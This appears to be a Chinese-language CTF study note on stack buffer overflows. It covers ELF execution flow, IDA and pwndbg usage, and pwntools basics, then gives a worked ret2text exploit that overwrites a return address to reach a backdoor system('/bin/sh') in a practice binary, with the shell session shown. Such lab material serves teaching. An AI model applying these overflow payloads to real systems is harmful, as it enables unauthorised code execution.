# Stack Exploit

[TOC]





## 前置

* 查看进程空间

  * 方法一

    > 正在运行的程序 `ps -a`查看pid
    >
    > `cat /proc/pid/maps`即可查看

  * 方法二

    > 安装pwndbg插件
    >
    > ```bash
    > gdb a.out
    > --- 进入动态调试 ---
    > b main --- 打下断点
    > r      --- 开始运行
    > vmmap  --- 查看进程空间
    > ```



* static linked program 执行过程

  ```
  ./binary 
      |
      +
  	fork()                                                    main()
      |                                                         +
      +                                                         |
  execve("./binary", *argv[], *envp[])                        _start              user mode
  ----|---------------------------------------------------------+-----------------------------
      +                                                         |                 kernel mode
  sys_execve()                                           load_elf_binary()
      |                                                         +
      +                                                         |
  do_execve() ---------------------------------------  search_binary_handler()
  
  ```

  

* dynamic linked program 执行过程

  ```
  ./binary 
      |
      +                             __libc_start_main() ----> _init
  	fork()                                   |                  |    
      |                                      +                  +
      |                                   _start              main()             
      +                                      |                 
  execve("./binary",*argv[],*envp[])       ld.so                                   user mode
  ----|--------------------------------------+-----------------------------------------------
      +                                      |                                   kernel mode
  sys_execve()                       load_elf_binary()
      |                                      +
      +                                      |
  do_execve() ------------------- search_binary_handler()
  
  ```



参数传递

* x86

  > stack

* amd64

  > rdi -> rsi -> rdx -> rcx -> r8 -> r9 ----> stack

* leave相当于

  ```assembly
  mov %ebp, %esp
  pop %ebp
  ```

* ret相当于

  ```assembly
  pop %eip
  ```

* 目前由于 the NX bits 保护措施的开启，栈缓冲区不可执行，故当下的常用手段变为向 bss 缓冲区写入 shellcode 或向堆缓冲区写入 shellcode 并使用 mprotect 赋予其可执行权限



## IDA

* 一般只用`IDA View-A`足矣

* F5 ---> C代码

* 在C代码中双击函数 ---> 进入相应的函数定义界面 ---> Esc 返回

* 左侧栏

  > 白色部分：写死在ELF文件中的函数
  >
  > 粉色部分：动态链接的标识符（此处留在ELF文件中的只是一些表项）

* `_start`不可反编译

  > 在main函数之前，_start帮助做ELF文件执行时的初始化工作，在编译器中通过汇编完成

* 汇编代码和`C`或`Machine Code`的交互

  * 机器码和汇编语句同时显示

    > Options --> general -->( right ) Number of opcode bytes (graph)设置即可

  * 汇编语句与C语言同时显示

    > 体现传参与具体实现
    >
    > C语言界面 --> 全部选中 --> 右键 --> Copy to assembly

    <img src="D:\github\pwn\pwn_study\images\ida_assembly_and_C.png" alt="ida_assembly_and_C" style="zoom:33%;" />

* 在IDA View-A 中以text显示

  > 右键 text view 即可

* `Ctrl + S`保存即可

  > 此时在分析的程序`programA`下方出现一个`programA.idb`可以直接用ida打开它

* 找不到入口函数的时候（`main`不是显式的）

  > 先运行一下程序 ---> 会出现相应的字符串
  >
  > shift+(Fn)+f12 ---> string window
  >
  > 双击找到初始运行程序时候出现的字符串即可定位到主函数周围
  >
  > 定位到`.rodata`节 --> 在其右下方有被引用的位置，双击即可定位到`entry`入口函数地址周围

  <img src="D:\github\pwn\pwn_study\images\ida_string_window.png" alt="ida_string_window" style="zoom:38%;" />

* 关闭时候不保存相关数据库就不会出现相关的数据库文件



## 本地连接构造pwn环境部署

* 先把相应的程序在本地运行，然后攻击（io接口初始为本地），本地测试成功后再将io切换为远程接口

* 交互模式

  ```python
  $ python3                     --- 在本地打开一个python3交互窗口
  >>> from pwn import *
  # 如果是本地测试
  >>> io = process("./ret2text")  --- 在本地开启题目程序为一个进程
  [x] Starting local process './ret2text'
  [+] Starting local process './ret2text': pid 137784
  # 如果是远程测试
  >>> io = remote("106.54.129.202", 10006)   --- remote(ip,port),此处只是举例
  # 查看对象属性
  >>> io
  <pwnlib.tubes.process.process object at 0x7f00557f7f40>
  ```

  io参数

  ```python
  -----------------必须是字节流
  io.send(p32(14) + b"hello \x0a")
                      ----整数变为字节raw数据用p32(int a),字符串前需要添加b,可以包括不可见字符'\x0a'即'\n'
  io.sendline()
  -----------------io.send(b"Hello\n") <=> io.sendline(b"Hello")
  io.recv()
  io.recvline()
  ------------------
  io.process() 本地连接
  io.remote() 远程连接
  ```

  过程

  ```python
  >>> io.recvline()
  b'Have you heard of buffer overflow?\n'
  >>> io.send(p32(0) + b"\x0abc")
  >>> io.recv()
  [*] Process './ret2text' stopped with exit code 0 (pid 137784)
  b'It seems that you know nothing about it ......\n'
  ```

  

* 脚本模式

  > 在本机测试时，可以通过获取执行后获取本机的shell来验证pwn是否成功
  >
  > zsh  ----- exploit script ------> bash





## 实例

gets

```C
#include <stdio.h>
char *gets(char *s);
```









## 分类

### ret2text

**篡改栈帧上的返回地址为程序中已有的后门函数**

> 返回到`.text`段上
>
> 有时候`programmers`可能会在编程过程中给自己留一个后门`backdoor in ELF`

```
+-----------+
	kernel
+-----------+
  ret_addr = backdoor_addr ------------+
+-----------+                          |
  stack                                |
  ...                                  |
+-----------+                          |
  shared libraries                     |
+-----------+                          |
  ...                                  |
  heap                                 |                          
+-----------+                          |
  bss                                  |
+-----------+                          |
  data                                 |
+-----------+                          |
  ...                                  |
+-----------+                          |
  backdoor in ELF  <-------------------+
+-----------+                          
	Unused
+-----------+
```

#### Q1

* 查看保护机制

  > 只开启了`NX`

  ```python
  $ checksec ret2text
  [*] '/home/ganliber/Documents/ROP/Q1/ret2text'
      Arch:     i386-32-little
      RELRO:    Partial RELRO
      Stack:    No canary found
      NX:       NX enabled
      PIE:      No PIE (0x8048000)
  ```

* `ida`反汇编

  > `setbuf`用来关闭缓冲区（命题人使用），便于下方**无延迟**输出

  ```C
  int __cdecl main(int argc, const char **argv, const char **envp)
  {
    setbuf(stdin, 0);
    setbuf(stdout, 0); 
    
    puts("Have you heard of buffer overflow?");
    vulnerable();
    puts("It seems that you know nothing about it ......");
    return 0;
  }
  ```

  进入`vulnerable`，IDA会标识   **能够写的缓冲区`buf`的边界和ebp的距离**   （但最好通过动态调试来实现对溢出点的判断，查看进程空间）

  ```C
  int vulnerable()
  {
    char buffer[8]; // [esp+8h] [ebp-10h] BYREF
  
    gets(buffer);
    return 0;
  }
  ```

  建议全屏terminal，同时(仅仅针对自己的电脑ubuntu20.04)

  ```
  ctrl+shift+'+' 放大字体
  ctrl+'-' 缩小字体
  ```

* 进入`pwndbg`调试

  ```python
  gdb ret2text
  ```

* 调试指令与笔记

  ```
  b: break
  n: next(单步调试)
  s: step in (进入到子函数内部)
  			-------- 注意下方[BACKTRACE]栏目显示的调用关系,从上往下调用关系是由内向外的,0号函数是当前函数栈帧
  stack 24 : 查看24行栈内容
  			-------- 查看栈帧时,注意查看[ebp ... esp]之间的部分,即为当前函数栈区间
  			-------- 如下图所示,紧挨着寄存器列（橙色）的是地址值, 右侧（红、粉色）是该地址的内容
  			-------- 我们的目标是溢出修改ebp紧挨着的下方的值即 0xffffcd8c 处的值（这里原本是 value of old eip）
  			-------- 该栈图示高地址在下，低地址在上
  			-------- 注意到写'AAAAAAAA'开始处是0008, ebp处是0018, 恰好相差了10h
  ```

  <img src="D:\github\pwn\pwn_study\images\gdb_stack_analyse.png" alt="gdb_stack_analyse" style="zoom:50%;" />

* 通过ida分析发现**后门函数**

  ```C
  int get_shell()
  {
    system("/bin/sh");
    return 0;
  }
  ```

* 查找后门函数地址

  ```
  ida View-A (text view) --> 左侧函数双击后门函数即可跳转到响应汇编的.text地址
  此处观察得到其地址为 0x08048522
  所以构造payload时应该用 p32(0x08048522) 打包成 raw data
  由于是4个字节因此对应32比特,用p32打包
  注意发送payload后需要调用
  io.interactive()
  进入交互模式，可以观察到此时已经在python交互模式下获得了一个shell，可以使用pwd,ls等命令，夺取了本机的控制权
  ```

  <img src="D:\github\pwn\pwn_study\images\locate_getshell_address.png" alt="locate_getshell_address" style="zoom: 33%;" />

* 效果

  ```python
  >>> from pwn import *
  >>> io=process('./ret2text')
  [x] Starting local process './ret2text'
  [+] Starting local process './ret2text': pid 138946
  >>> io.recvline()
  b'Have you heard of buffer overflow?\n'
  >>> payload = b'A' * 16 + b'BBBB' +p32(0x08048522)
  >>> io.sendline(payload)
  >>> io.interactive()
  [*] Switching to interactive mode
  ls
  ret2text
  pwd
  /home/ganliber/Documents/ROP/Q1
  ls -alh
  total 24K
  drwxrwxr-x 2 ganliber ganliber 4.0K 6月   2 02:10 .
  drwxrwxrwx 4 ganliber ganliber 4.0K 6月   1 23:44 ..
  -rw------- 1 ganliber ganliber  127 6月   2 02:10 .gdb_history
  -rwxrw-rw- 1 ganliber ganliber 9.7K 5月   8  2020 ret2text
  ls
  ret2text
  ```

* 脚本攻击

  > 可以先切换为`sh`，然后攻击后用`echo $SHELL`查看当前的shell

  ```python
  ganliber@ganliber-virtual-machine:~/Documents/ROP/Q1$ python3 exp.py
  [+] Starting local process './ret2text': pid 139154
  [*] Switching to interactive mode
  $ echo $SHELL
  /bin/zsh
  $  
  ```

  



### ret2libc





